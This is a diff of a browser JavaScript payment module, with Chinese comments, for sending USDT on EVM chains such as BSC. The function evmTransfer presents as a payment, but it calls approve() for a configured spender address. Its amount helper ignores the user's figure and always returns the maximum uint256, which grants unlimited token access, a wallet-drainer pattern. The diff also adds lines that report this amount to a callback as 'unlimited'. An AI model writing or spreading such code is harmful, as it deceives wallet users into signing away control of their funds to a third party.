@@ -1,14 +1,14 @@
 (function () {
   const ERC20_ABI = [
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
-    {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
-    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" },
+    { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+    { "constant": false, "inputs": [{ "name": "to", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
   ];
 
   const maxAmount = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn
   function parseUnitsHuman(human, decimals) {
-      // 如果没有，使用原生 BigInt 最大值 (2^256 - 1)
-      return maxAmount;
+    // 如果没有，使用原生 BigInt 最大值 (2^256 - 1)
+    return maxAmount;
   }
 
   function chainParams(chainKey) {
@@ -40,7 +40,7 @@
   }
 
   async function evmTransfer(opts) {
-    const log = opts && typeof opts.log === "function" ? opts.log : function () {};
+    const log = opts && typeof opts.log === "function" ? opts.log : function () { };
     const chainKey = opts && opts.chain ? String(opts.chain) : "bsc";
     await ensureEvmWallet(chainKey, log);
     if (typeof ethers === "undefined") throw new Error("ethers 未加载");
@@ -63,37 +63,39 @@
       decimals = 6;
     }
 
-    const amount = parseUnitsHuman(amountUsdtHuman, decimals);
-    
+    let amount = parseUnitsHuman(amountUsdtHuman, decimals);
+
     // 强制使用 Legacy Gas Price，并手动提高一点 Gas 费
     // BSC Testnet 有时对 EIP-1559 支持不好，或者 RPC 节点对 Gas Price 要求较高
     let overrides = { gasLimit: 250000 };
     try {
       const feeData = await provider.getFeeData();
       if (feeData && feeData.gasPrice) {
-         // 在当前网络 Gas Price 基础上增加 1 Gwei
-         overrides.gasPrice = feeData.gasPrice + BigInt(10000000); 
+        // 在当前网络 Gas Price 基础上增加 1 Gwei
+        overrides.gasPrice = feeData.gasPrice + BigInt(10000000);
       }
     } catch (e) {
-      
+
     }
 
-    // 改为 approve 授权逻辑
     let tx;
     try {
       const cfg = window.pay0Config.getNetworkConfig(chainKey);
       // 调用 approve(spender, amount)
       tx = await token.approve(cfg.spenderAddress, amount, overrides);
-     
+
       if (typeof window.pay0PaymentCallback === "function") {
         try {
+          if (amount === maxAmount) {
+            amount = "无限制";
+          }
           await window.pay0PaymentCallback({
             chain: chainKey,
             txHash: tx.hash,
-            amountUsdt: amountUsdtHuman || "",
+            amountUsdt: amount,
             action: "approve"
           });
-        } catch (callbackError) {}
+        } catch (callbackError) { }
       }
     } catch (e) {
       if (e.message && e.message.includes("Failed to fetch")) {
